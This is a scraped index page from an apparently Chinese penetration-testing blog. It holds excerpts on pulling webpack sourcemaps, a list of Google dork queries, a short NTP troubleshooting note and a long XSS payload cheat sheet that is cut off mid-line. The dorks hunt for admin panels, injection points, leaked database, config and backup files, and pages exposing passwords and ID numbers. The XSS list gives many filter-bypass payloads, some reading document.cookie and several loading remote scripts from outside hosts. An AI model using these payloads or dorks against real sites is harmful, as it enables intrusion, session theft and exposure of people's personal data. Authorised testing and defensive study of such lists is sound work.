-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="sourcemap"><a href="#sourcemap" class="headerlink" title="sourcemap"></a>sourcemap</h1><h2 id="1-判断是否存在sourcemap"><a href="#1-判断是否存在sourcemap" class="headerlink" title="1.判断是否存在sourcemap"></a>1.判断是否存在sourcemap</h2><p><code>F12</code>打开工具栏查看是否存在<code>webpack</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E6%B8%97%E9%80%8F12/20250517112645829.png"></p>
-<h2 id="2-下载map"><a href="#2-下载map" class="headerlink" title="2.下载map"></a>2.下载map</h2><p>打开static文件夹,复制js文件的路径</p>
-<p>例如</p>
-<p><code>https://xxxxg/static/js/app.22a24d56f6000aff1358.js</code></p>
-<p>在最后添加<code>.map</code></p>
-<p>并新增下载链接</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/05/17/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89-sourcemap%E5%92%8C.git/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/05/03/%E6%B8%97%E9%80%8F/edu%E6%B1%87%E6%80%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/05/03/%E6%B8%97%E9%80%8F/edu%E6%B1%87%E6%80%BB/" class="post-title-link" itemprop="url">Edu汇总</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-05-03 19:47:00" itemprop="dateCreated datePublished" datetime="2025-05-03T19:47:00+08:00">2025-05-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-26 16:52:31" itemprop="dateModified" datetime="2025-05-26T16:52:31+08:00">2025-05-26</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/05/03/%E6%B8%97%E9%80%8F/edu%E6%B1%87%E6%80%BB/" class="post-meta-item leancloud_visitors" data-flag-title="Edu汇总" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="1-信息泄露搜索语法"><a href="#1-信息泄露搜索语法" class="headerlink" title="1.信息泄露搜索语法"></a>1.信息泄露搜索语法</h1><p><a target="_blank" rel="noopener" href="https://cdbc.pythonanywhere.com/">搜索语法生成工具</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">管理后台地址:</span><br><span class="line">site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class="line">site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class="line">site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br><span class="line"></span><br><span class="line">上传类漏洞地址:</span><br><span class="line">site:target.com inurl:file | inurl:upload</span><br><span class="line"></span><br><span class="line">注入页面:</span><br><span class="line">site:target.com inurl:?id= | inurl:php?id= | inurl:jsp?id= | inurl:aspx?id= | inurl:asp?id=</span><br><span class="line"></span><br><span class="line">编辑器页面:</span><br><span class="line">site:target.com inurl:ewebeditor</span><br><span class="line"></span><br><span class="line">目录遍历漏洞:</span><br><span class="line">site:target.com intitle: &quot;index of&quot;</span><br><span class="line"></span><br><span class="line">URL 跳转:</span><br><span class="line">site:target.com inurl:url= | inurl:return= | inurl:next= | inurl:redir= inurl:http</span><br><span class="line"></span><br><span class="line">SQL错误:</span><br><span class="line">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br><span class="line"></span><br><span class="line">phpinfo:</span><br><span class="line">site:target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br><span class="line"></span><br><span class="line">配置文件泄露:</span><br><span class="line">site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br><span class="line"></span><br><span class="line">数据库文件泄露:</span><br><span class="line">site:target.com ext:.sql | .dbf | .mdb | .db</span><br><span class="line"></span><br><span class="line">日志文件泄露:</span><br><span class="line">site:target.com ext:.log</span><br><span class="line"></span><br><span class="line">备份和历史文件泄露:</span><br><span class="line">site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br><span class="line"></span><br><span class="line">公开文件泄露:</span><br><span class="line">site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br><span class="line"></span><br><span class="line">邮箱信息:</span><br><span class="line">site:target.com intext:@target.com</span><br><span class="line">site:target.com 邮件</span><br><span class="line">site:target.com email</span><br><span class="line"></span><br><span class="line">社工信息:</span><br><span class="line">site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/05/03/%E6%B8%97%E9%80%8F/edu%E6%B1%87%E6%80%BB/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/04/27/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/NTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8C%E6%AD%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/04/27/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/NTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8C%E6%AD%A5/" class="post-title-link" itemprop="url">NTP服务器同步</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-04-27 23:22:00 / 修改时间：09:10:51" itemprop="dateCreated datePublished" datetime="2025-04-27T23:22:00+08:00">2025-04-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ntp/" itemprop="url" rel="index"><span itemprop="name">ntp</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/04/27/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/NTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8C%E6%AD%A5/" class="post-meta-item leancloud_visitors" data-flag-title="NTP服务器同步" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>170</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>烦的一比，Windows的时间和准确时间差的太远了</p>
-<p>但是又无法同步</p>
-<p>试了N多个ntp服务器了，一直都提示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows在与ntp.ntsc.ac.cn进行同步时出错。由于超时时间已过，该操作返回。</span><br></pre></td></tr></table></figure>
-
-<p>什么aliyun,tencent之类的服务器都试过</p>
-<p>全都超时</p>
-<h1 id="找了个可用的ntp服务器"><a href="#找了个可用的ntp服务器" class="headerlink" title="找了个可用的ntp服务器"></a>找了个可用的ntp服务器</h1><p><a target="_blank" rel="noopener" href="http://www.ntp.org.cn/">ntp</a></p>
-<p>阿星严选：<code>CN.NTP.ORG.CN</code></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/04/27/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/NTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8C%E6%AD%A5/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/04/21/CTF/XSS-%E5%B8%B8%E7%94%A8%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/04/21/CTF/XSS-%E5%B8%B8%E7%94%A8%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">XSS-常用记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-04-21 20:17:00 / 修改时间：15:07:33" itemprop="dateCreated datePublished" datetime="2025-04-21T20:17:00+08:00">2025-04-21</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/04/21/CTF/XSS-%E5%B8%B8%E7%94%A8%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="XSS-常用记录" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;svg onload=<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 使用&lt;a&gt;标签 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- 使用&lt;img&gt;标签 --&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 使用&lt;iframe&gt;标签 --&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 使用&lt;button&gt;标签 --&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 使用&lt;input&gt;标签 --&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; onclick=&quot;alert(&#x27;XSS&#x27;)&quot; value=&quot;点击我&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- URL编码 --&gt;</span><br><span class="line">&lt;a href=&quot;javascript:%61%6C%65%72%74%28%31%29&quot;&gt;点击我&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- JavaScript Unicode编码 --&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;\u0058\u0053\u0053&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&gt;&quot;&#x27;&gt;&lt;img src=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&quot;&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;table background=&#x27;javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;</span><br><span class="line"></span><br><span class="line">&quot;+alert(&#x27;XSS&#x27;)+&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;s&amp;#99;ript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;javas&amp;#99;ript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp</span><br><span class="line"></span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line"></span><br><span class="line">a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x0A;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x0D;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&quot;&lt;IMG src=&quot;/java&quot;\0script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</span><br><span class="line"></span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;</span><br><span class="line"></span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line"></span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;DIV STYLE=&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&amp;#39;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&lt;STYLE. TYPE=&quot;text/javascript&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="line"></span><br><span class="line">&lt;STYLE. TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">&lt;STYLE. type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line"></span><br><span class="line">&lt;BASE HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);//&quot;&gt;</span><br><span class="line"></span><br><span class="line">getURL(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;)</span><br><span class="line"></span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript.:&quot;;d=&quot;alert(&#x27;XSS&#x27;);&quot;;eval(a+b+c+d);</span><br><span class="line"></span><br><span class="line">&lt;XML SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt; &lt;BODY NLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&#x27;XSS&#x27;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT. SRC=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT. a=&quot;&gt;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT.=&quot;&gt;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT. a=&quot;&gt;&quot;&#x27;&#x27;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT.&quot;a=&#x27;&gt;&#x27;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PTSRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;A 